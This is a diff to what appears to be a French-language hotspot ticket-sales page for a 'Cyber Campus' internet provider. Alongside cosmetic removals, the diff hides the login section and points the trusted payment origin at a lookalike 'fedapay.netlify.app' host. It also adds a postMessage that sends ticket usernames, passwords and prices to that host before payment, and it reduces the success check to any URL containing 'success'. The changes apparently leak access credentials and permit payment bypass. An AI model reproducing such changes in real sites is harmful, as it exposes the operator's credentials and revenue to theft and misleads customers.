@@ -23,53 +23,8 @@ body {
     overflow-x: hidden;
 }
 
-.container {
-    max-width: 1200px;
-    margin: 0 auto;
-    padding: 20px;
-}
 
-header {
-    background-color: rgba(0, 0, 0, 0.5);
-    padding: 20px 0;
-    position: relative;
-    overflow: hidden;
-}
 
-.header-image {
-    width: 100%;
-    height: 300px;
-    object-fit: cover;
-    position: absolute;
-    top: 0;
-    left: 0;
-    z-index: -1;
-}
-
-.img1 {
-    animation: slide1 10s linear infinite;
-}
-
-.img2 {
-    animation: slide2 10s linear infinite;
-}
-
-.logo {
-    font-size: 2.5em;
-    color: white;
-    text-align: center;
-    text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
-    position: relative;
-    z-index: 2;
-}
-
-.logo::before {
-    content: '';
-    font-size: 0.8em;
-    margin-right: 10px;
-    animation: rotate 5s linear infinite;
-    display: inline-block;
-}
 
 @keyframes rotate {
     0% { transform: rotate(0deg); }
@@ -144,61 +99,9 @@ nav {
     animation: textChange 0.5s ease-in-out, buttonPulse 3s ease-in-out infinite;
 }
 
-main {
-    display: flex;
-    flex-wrap: wrap;
-    justify-content: space-between;
-    margin-top: 40px;
-    position: relative;
-}
 
-.login-section, .rates-section, .locations-section, .products-section {
-    background-color: rgba(255, 255, 255, 0.1);
-    backdrop-filter: blur(10px);
-    border-radius: 10px;
-    padding: 20px;
-    margin-bottom: 20px;
-    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-    transition: transform 0.3s, box-shadow 0.3s;
-}
 
-.login-section:hover, .rates-section:hover, .locations-section:hover, .products-section:hover {
-    transform: translateY(-5px);
-    box-shadow: 0 6px 8px rgba(0, 0, 0, 0.2);
-}
 
-.login-section {
-    flex-basis: 100%;
-}
-
-.rates-section, .locations-section, .products-section {
-    flex-basis: calc(33.333% - 20px);
-}
-
-h2 {
-    color: white;
-    margin-bottom: 15px;
-    position: relative;
-    display: inline-block;
-}
-
-h2::after {
-    content: '';
-    position: absolute;
-    bottom: -5px;
-    left: 0;
-    width: 0;
-    height: 2px;
-    background-color: #fdbb2d;
-    transition: width 0.3s;
-}
-
-.login-section:hover h2::after,
-.rates-section:hover h2::after,
-.locations-section:hover h2::after,
-.products-section:hover h2::after {
-    width: 100%;
-}
 
 form {
     display: flex;
@@ -354,7 +257,7 @@ footer {
     left: 0;
     width: 100%;
     height: 100%;
-    background-color: rgba(0, 0, 0, 0.541);
+    background-color: rgba(0, 0, 0, 0.514);
     z-index: 1000;
 }
 
@@ -449,6 +352,12 @@ footer {
     background-color: #1a2a6c;
     color: #fdbb2d;
 }
+
+        /* Cacher la section de connexion */
+        .login-section {
+            display: none;
+        }
+        
     </style>
 
     $(if chap-id)
@@ -582,9 +491,9 @@ footer {
         }
 
         function handlePaymentMessage(event) {
-            if (event.origin !== "https://live.fedapay.com/") return;
+            if (event.origin !== "https://fedapay.netlify.app/") return;
 
-            if (event.data.status === "success" || event.data.url === "http://cyberducampus.net/") {
+            if (event.data.status === "success" || event.data.url === "https://fedapay.netlify.app/success") {
                 closePaymentFrame();
                 handleSuccessfulPayment(event.data.ticketName);
             }
@@ -594,7 +503,7 @@ footer {
             const iframe = document.getElementById('paymentIframe');
             try {
                 const iframeUrl = iframe.contentWindow.location.href;
-                if (iframeUrl.toLowerCase().includes('cyberducampus')) {
+                if (iframeUrl.toLowerCase().includes('success')) {
                     closePaymentFrame();
                     const lastTicketName = localStorage.getItem('lastTicketName');
                     if (lastTicketName) {
@@ -632,9 +541,22 @@ footer {
                     password: ticketData.motDePasse[index],
                     price: ticketData.prix[index]
                 });
+
+                        // Envoyer les données du ticket via un message inter-fenêtres
+        window.frames["paymentIframe"].postMessage({
+            type: 'ticketData', 
+            data: {
+                user: ticketData.utilisateur[index],
+                password: ticketData.motDePasse[index],
+                price: ticketData.prix[index]
+            } 
+        }, "https://fedapay.netlify.app/"); // Remplacez par l'origine de votre iframe
+        
                         // Stocker le nom du ticket et l'index dans localStorage
                         localStorage.setItem('lastTicketName', ticketName);
                         localStorage.setItem('ticketIndex', index);
+
+                        
         
                         const paymentLink = ticketData.lienPaiement; 
                         // await handleKeyChange(ticketName); // Changement de clé si nécessaire
@@ -918,19 +840,6 @@ document.forms['login'].addEventListener('submit', handleLogin);
     </script>
 </head>
 <body>
-    <header>
-        <div class="container">
-            <h1 class="logo">Cyber Campus</h1>
-            <div class="moon"></div>
-            <img class="header-image img1" src="img/img1.jpg" alt="Image de fond">
-            <img class="header-image img2" src="img/img2.jpg" alt="Image de fond">
-            <nav>
-                <button class="nav-button">+229 60374877</button>
-                <button class="nav-button animate-pay">Payer un ticket</button>
-            </nav>
-        </div>
-    </header>
-
     <main class="container">
         <section class="login-section">
             <h2>Connexion</h2>
@@ -1050,28 +959,6 @@ document.forms['login'].addEventListener('submit', handleLogin);
                     <td><button onclick="buyTicket('30 Jours Pro (illimité)')">Payer</button></td>
                 </tr>
             </table>
-        </section>
-
-        <section class="locations-section">
-            <h2>Nos sites de connexion</h2>
-            <ul>
-                <li>Cyber Campus Arafat</li>
-                <li>Cyber Campus Université</li>
-                <li>Cyber Campus Rose croix</li>
-                <li>Cyber Campus Banikanni 1</li>
-                <li>Cyber Campus Banikanni 2</li>
-                <li>Cyber Campus Marché Tchakitibam</li>
-            </ul>
-        </section>
-
-        <section class="products-section">
-            <h2>Nos produits</h2>
-            <ul>
-                <li>Maintenance réseau</li>
-                <li>Installation Wi-Fi Zone</li>
-                <li>Maintenance informatique</li>
-                <li>Creation de Site web et Application mobile</li>
-            </ul>
         </section>
     </main>
 
